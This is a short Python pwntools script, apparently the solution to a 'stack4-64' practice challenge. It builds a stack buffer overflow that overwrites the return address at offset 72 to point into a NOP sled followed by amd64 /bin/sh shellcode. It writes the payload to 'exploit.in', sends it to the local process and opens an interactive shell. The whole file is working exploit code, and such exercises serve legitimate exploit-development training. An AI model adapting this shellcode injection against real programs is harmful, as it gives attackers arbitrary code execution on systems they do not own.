from pwn import *

context.clear(arch="amd64")
p = process('./stack4-64')

offset_ret = 72
nop_sled = 300
ret_addr = 0x7ffffff00000
buffer_addr = 0x7fffffffe170

crash_str = flat({offset_ret:pack(ret_addr)})
exploit_str = flat({offset_ret:pack(buffer_addr+offset_ret+8),nop_sled:asm(shellcraft.amd64.sh())},filler='\x90')

exploit_file = open('exploit.in', 'w')
exploit_file.write(exploit_str)

p.sendline(exploit_str)
p.interactive()
p.corefile
